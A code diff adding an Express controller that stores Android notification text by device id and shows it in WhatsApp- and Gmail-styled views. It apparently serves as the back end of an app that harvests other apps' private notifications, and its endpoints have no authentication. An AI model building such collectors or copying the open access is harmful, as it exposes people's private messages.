@@ -1,0 +1,78 @@
+const MainNotification = require('../models/mainNotificationSchema');
+
+exports.saveNotification = async (req, res) => {
+    try {
+        const { uniqueid, packageName, title, text } = req.body;
+
+        if (!uniqueid || !packageName || !title || !text) {
+            return res.status(400).json({ success: false, message: 'Missing required fields' });
+        }
+
+        const notification = new MainNotification({
+            uniqueid,
+            packageName,
+            title,
+            text
+        });
+
+        await notification.save();
+        return res.status(200).json({ success: true, message: 'Notification saved successfully' });
+
+    } catch (error) {
+        console.error('Save Error:', error);
+        return res.status(500).json({ success: false, message: 'Server error' });
+    }
+};
+
+exports.renderNotifications = async (req, res) => {
+    try {
+        const { uniqueid } = req.params;
+        const { package: pkg } = req.query;
+
+        if (!pkg) {
+            return res.status(400).send("Package name is required in query.");
+        }
+
+        const notifications = await MainNotification.find({
+            uniqueid,
+            packageName: pkg
+        }).sort({ receivedAt: -1 });
+
+        let template;
+        if (pkg === 'com.whatsapp') {
+            template = 'main-notificationWhatsapp';
+        } else if (pkg === 'com.google.android.gm') {
+            template = 'main-notificationGmail';
+        } else {
+            return res.status(400).send("Unsupported package for rendering.");
+        }
+
+        return res.render(template, {
+            title: `Notifications for ${pkg}`,
+            uniqueid,
+            notifications
+        });
+
+    } catch (error) {
+        console.error('Render Error:', error);
+        return res.status(500).send('Server error while rendering notifications');
+    }
+};
+
+exports.getByUniqueId = async (req, res) => {
+    try {
+        const { uniqueid } = req.params;
+
+        const notifications = await MainNotification.find({ uniqueid }).sort({ receivedAt: -1 });
+
+        if (!notifications.length) {
+            return res.status(404).json({ success: false, message: 'No notifications found' });
+        }
+
+        return res.status(200).json({ success: true, notifications });
+
+    } catch (error) {
+        console.error('Get Error:', error);
+        return res.status(500).json({ success: false, message: 'Server error' });
+    }
+};
